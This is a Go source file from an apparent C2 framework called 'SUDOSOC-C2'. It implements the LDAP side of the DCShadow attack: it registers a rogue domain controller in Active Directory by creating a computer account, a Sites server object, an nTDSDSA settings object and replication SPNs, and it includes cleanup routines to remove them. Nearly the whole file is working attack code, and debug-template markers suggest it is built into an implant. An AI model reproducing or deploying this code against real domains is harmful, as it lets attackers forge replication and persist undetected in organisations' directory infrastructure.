package dcshadow

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	Active Directory LDAP operations for DCShadow.

	DCShadow requires registering a fake Domain Controller in AD.
	The registration involves creating/modifying several AD objects:

	  1. Computer object:
	       CN=<fakeDC>,CN=Computers,DC=domain,DC=com
	       objectClass: computer
	       sAMAccountName: FAKEDC$
	       userAccountControl: 0x82000 (SERVER_TRUST_ACCOUNT + DONT_EXPIRE_PASSWD)

	  2. Server object (in Sites & Services):
	       CN=<fakeDC>,CN=<site>,CN=Sites,CN=Configuration,DC=domain,DC=com
	       objectClass: server
	       dNSHostName: fakedc.domain.com
	       serverReference: DN of computer object

	  3. nTDSDSA object (DC settings):
	       CN=NTDS Settings,CN=<fakeDC>,CN=<site>,...
	       objectClass: nTDSDSA
	       objectCategory: CN=NTDS-DSA,...
	       invocationId: <random GUID>
	       msDS-Behavior-Version: 7 (Windows Server 2016)
	       msDS-ReplicationEpoch: 0
	       options: 1 (IS_GC)

	  4. SPN registration on the fake computer account:
	       E3514235-4B06-11D1-AB04-00C04FC2DCD2/<invocationGUID>/<domain>
	       GC/<fqdn>/<domain>
	       HOST/<fqdn>
	       HOST/<netbios>

	All LDAP operations use the Windows LDAP API (wldap32.dll / ldap.h).
*/

import (
	"fmt"
	"strings"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

var (
	modWldap32          = windows.NewLazySystemDLL("wldap32.dll")
	procLdapInitW       = modWldap32.NewProc("ldap_initW")
	procLdapSetOption   = modWldap32.NewProc("ldap_set_option")
	procLdapBindSW      = modWldap32.NewProc("ldap_bind_sW")
	procLdapAddSW       = modWldap32.NewProc("ldap_add_sW")
	procLdapModifySW    = modWldap32.NewProc("ldap_modify_sW")
	procLdapDeleteSW    = modWldap32.NewProc("ldap_delete_sW")
	procLdapSearchSW    = modWldap32.NewProc("ldap_search_sW")
	procLdapMsgFree     = modWldap32.NewProc("ldap_msgfree")
	procLdapFirstEntry  = modWldap32.NewProc("ldap_first_entry")
	procLdapGetValues   = modWldap32.NewProc("ldap_get_valuesW")
	procLdapValueFree   = modWldap32.NewProc("ldap_value_freeW")
	procLdapUnbind      = modWldap32.NewProc("ldap_unbind")
)

// LDAP connection constants.
const (
	ldapVersion3       = 3
	ldapOptProtocolVersion = 0x11
	ldapOptReferrals   = 0x08
	ldapAuthNegotiate  = 0x1086
	ldapScopeSubtree   = 2
)

// LDAPMod operation types.
const (
	ldapModAdd     = 0
	ldapModDelete  = 1
	ldapModReplace = 2
)

// LDAPConnection wraps an LDAP session handle.
type LDAPConnection struct {
	handle uintptr
	dc     string
}

// Connect establishes an LDAP connection to the given DC.
func Connect(dcHostname string) (*LDAPConnection, error) {
	hostPtr, _ := windows.UTF16PtrFromString(dcHostname)

	handle, _, _ := procLdapInitW.Call(
		uintptr(unsafe.Pointer(hostPtr)),
		389, // default LDAP port
	)
	if handle == 0 {
		return nil, fmt.Errorf("ldap_init(%s) failed", dcHostname)
	}

	// Set LDAP v3.
	ver := uint32(ldapVersion3)
	procLdapSetOption.Call(handle, ldapOptProtocolVersion,
		uintptr(unsafe.Pointer(&ver)))

	// Disable referral chasing.
	noRef := uint32(0)
	procLdapSetOption.Call(handle, ldapOptReferrals,
		uintptr(unsafe.Pointer(&noRef)))

	// Bind using current Kerberos/NTLM credentials.
	r, _, _ := procLdapBindSW.Call(handle, 0, 0, ldapAuthNegotiate)
	if r != 0 {
		return nil, fmt.Errorf("ldap_bind_s NTSTATUS=0x%x", r)
	}
	// {{if .Config.Debug}}
	log.Printf("[dcshadow] LDAP connected to %s", dcHostname)
	// {{end}}
	return &LDAPConnection{handle: handle, dc: dcHostname}, nil
}

// Close releases the LDAP connection.
func (c *LDAPConnection) Close() {
	if c.handle != 0 {
		procLdapUnbind.Call(c.handle)
		c.handle = 0
	}
}

// AddObject adds an LDAP object with the given attributes.
func (c *LDAPConnection) AddObject(dn string, attrs map[string][]string) error {
	dnPtr, _ := windows.UTF16PtrFromString(dn)
	mods := buildLDAPMods(ldapModAdd, attrs)
	defer freeLDAPMods(mods)

	r, _, _ := procLdapAddSW.Call(
		c.handle,
		uintptr(unsafe.Pointer(dnPtr)),
		uintptr(unsafe.Pointer(&mods[0])),
	)
	if r != 0 {
		return fmt.Errorf("ldap_add_s(%s) code=%d", dn, r)
	}
	// {{if .Config.Debug}}
	log.Printf("[dcshadow] LDAP add: %s", dn)
	// {{end}}
	return nil
}

// ModifyObject modifies attributes of an existing LDAP object.
func (c *LDAPConnection) ModifyObject(dn string, op int, attrs map[string][]string) error {
	dnPtr, _ := windows.UTF16PtrFromString(dn)
	mods := buildLDAPMods(op, attrs)
	defer freeLDAPMods(mods)

	r, _, _ := procLdapModifySW.Call(
		c.handle,
		uintptr(unsafe.Pointer(dnPtr)),
		uintptr(unsafe.Pointer(&mods[0])),
	)
	if r != 0 {
		return fmt.Errorf("ldap_modify_s(%s) code=%d", dn, r)
	}
	return nil
}

// DeleteObject removes an LDAP object.
func (c *LDAPConnection) DeleteObject(dn string) error {
	dnPtr, _ := windows.UTF16PtrFromString(dn)
	r, _, _ := procLdapDeleteSW.Call(
		c.handle,
		uintptr(unsafe.Pointer(dnPtr)),
	)
	if r != 0 {
		return fmt.Errorf("ldap_delete_s(%s) code=%d", dn, r)
	}
	return nil
}

// SearchOne finds the first DN matching filter under baseDN.
func (c *LDAPConnection) SearchOne(baseDN, filter, attr string) (string, error) {
	baseDNPtr, _ := windows.UTF16PtrFromString(baseDN)
	filterPtr, _ := windows.UTF16PtrFromString(filter)
	attrPtr, _ := windows.UTF16PtrFromString(attr)
	attrList := []*uint16{attrPtr, nil}

	var result uintptr
	r, _, _ := procLdapSearchSW.Call(
		c.handle,
		uintptr(unsafe.Pointer(baseDNPtr)),
		ldapScopeSubtree,
		uintptr(unsafe.Pointer(filterPtr)),
		uintptr(unsafe.Pointer(&attrList[0])),
		0, // attrsonly=false
		0, 0, 0,
		uintptr(unsafe.Pointer(&result)),
	)
	if r != 0 || result == 0 {
		return "", fmt.Errorf("ldap_search_s failed code=%d", r)
	}
	defer procLdapMsgFree.Call(result)

	entry, _, _ := procLdapFirstEntry.Call(c.handle, result)
	if entry == 0 {
		return "", fmt.Errorf("no results for filter %s", filter)
	}
	vals, _, _ := procLdapGetValues.Call(c.handle, entry,
		uintptr(unsafe.Pointer(attrPtr)))
	if vals == 0 {
		return "", fmt.Errorf("no values for %s", attr)
	}
	defer procLdapValueFree.Call(vals)

	firstVal := *(**uint16)(unsafe.Pointer(vals))
	if firstVal == nil {
		return "", fmt.Errorf("empty value")
	}
	return windows.UTF16PtrToString(firstVal), nil
}

// ─── DCShadow-specific LDAP operations ───────────────────────────────────

// RegisterFakeDC creates all AD objects needed for DCShadow registration.
// Returns the DNs of created objects so they can be removed during cleanup.
func RegisterFakeDC(conn *LDAPConnection, cfg *DCShadowConfig) (*FakeDCRegistration, error) {
	reg := &FakeDCRegistration{Config: cfg}

	// Find domain NC and configuration NC.
	domainNC := domainToDN(cfg.Domain)
	configNC := "CN=Configuration," + domainNC
	site := cfg.Site
	if site == "" {
		site = "Default-First-Site-Name"
	}

	// 1. Create computer account.
	computerDN := fmt.Sprintf("CN=%s,CN=Computers,%s", cfg.FakeDCName, domainNC)
	err := conn.AddObject(computerDN, map[string][]string{
		"objectClass":      {"top", "person", "organizationalPerson", "user", "computer"},
		"sAMAccountName":   {cfg.FakeDCName + "$"},
		"userAccountControl": {"532480"}, // 0x82000: SERVER_TRUST_ACCOUNT | DONT_EXPIRE_PASSWORD
		"dNSHostName":      {cfg.FakeFQDN},
		"servicePrincipalName": buildReplicationSPNs(cfg),
	})
	if err != nil {
		return nil, fmt.Errorf("create computer: %w", err)
	}
	reg.ComputerDN = computerDN

	// 2. Create Server object in Sites & Services.
	serverDN := fmt.Sprintf("CN=%s,CN=Servers,CN=%s,CN=Sites,%s",
		cfg.FakeDCName, site, configNC)
	err = conn.AddObject(serverDN, map[string][]string{
		"objectClass":     {"top", "server"},
		"dNSHostName":     {cfg.FakeFQDN},
		"serverReference": {computerDN},
	})
	if err != nil {
		conn.DeleteObject(computerDN)
		return nil, fmt.Errorf("create server: %w", err)
	}
	reg.ServerDN = serverDN

	// 3. Create nTDSDSA object (the actual DC settings object).
	ntdsDN := "CN=NTDS Settings," + serverDN
	err = conn.AddObject(ntdsDN, map[string][]string{
		"objectClass":          {"top", "applicationSettings", "nTDSDSA"},
		"invocationId":         {cfg.InvocationID.String()},
		"msDS-Behavior-Version": {"7"},
		"msDS-ReplicationEpoch": {"0"},
		"options":              {"1"}, // IS_GC
		"systemFlags":          {"33554432"},
	})
	if err != nil {
		conn.DeleteObject(serverDN)
		conn.DeleteObject(computerDN)
		return nil, fmt.Errorf("create nTDSDSA: %w", err)
	}
	reg.NtdsDN = ntdsDN

	// {{if .Config.Debug}}
	log.Printf("[dcshadow] fake DC registered: computer=%s server=%s ntds=%s",
		computerDN, serverDN, ntdsDN)
	// {{end}}
	return reg, nil
}

// UnregisterFakeDC removes all DCShadow AD objects in reverse order.
func UnregisterFakeDC(conn *LDAPConnection, reg *FakeDCRegistration) {
	if reg.NtdsDN != "" {
		conn.DeleteObject(reg.NtdsDN)
	}
	if reg.ServerDN != "" {
		conn.DeleteObject(reg.ServerDN)
	}
	if reg.ComputerDN != "" {
		conn.DeleteObject(reg.ComputerDN)
	}
	// {{if .Config.Debug}}
	log.Printf("[dcshadow] fake DC unregistered")
	// {{end}}
}

// buildReplicationSPNs returns the SPNs that real DCs use to find each other.
func buildReplicationSPNs(cfg *DCShadowConfig) []string {
	return []string{
		fmt.Sprintf("E3514235-4B06-11D1-AB04-00C04FC2DCD2/%s/%s",
			cfg.InvocationID.String(), cfg.Domain),
		fmt.Sprintf("GC/%s/%s", cfg.FakeFQDN, cfg.Domain),
		fmt.Sprintf("HOST/%s", cfg.FakeFQDN),
		fmt.Sprintf("HOST/%s", strings.ToUpper(cfg.FakeDCName)),
		fmt.Sprintf("LDAP/%s", cfg.FakeFQDN),
		fmt.Sprintf("LDAP/%s/%s", cfg.FakeFQDN, cfg.Domain),
	}
}

// domainToDN converts "corp.example.com" to "DC=corp,DC=example,DC=com".
func domainToDN(domain string) string {
	parts := strings.Split(domain, ".")
	dcs := make([]string, len(parts))
	for i, p := range parts {
		dcs[i] = "DC=" + p
	}
	return strings.Join(dcs, ",")
}

// ─── LDAP mod helpers ─────────────────────────────────────────────────────

// ldapModW is the Windows LDAP_MOD structure (Unicode version).
type ldapModW struct {
	ModOp   uint32
	ModType *uint16
	Values  **uint16
}

func buildLDAPMods(op int, attrs map[string][]string) []*ldapModW {
	mods := make([]*ldapModW, 0, len(attrs)+1)
	for k, vals := range attrs {
		kPtr, _ := windows.UTF16PtrFromString(k)
		// Build null-terminated array of value pointers.
		vPtrs := make([]*uint16, len(vals)+1)
		for i, v := range vals {
			vPtr, _ := windows.UTF16PtrFromString(v)
			vPtrs[i] = vPtr
		}
		vPtrs[len(vals)] = nil
		mod := &ldapModW{
			ModOp:   uint32(op),
			ModType: kPtr,
			Values:  &vPtrs[0],
		}
		mods = append(mods, mod)
	}
	mods = append(mods, nil) // null terminator
	return mods
}

func freeLDAPMods(_ []*ldapModW) {
	// Go GC handles memory; this is a placeholder for future CGO cleanup.
}
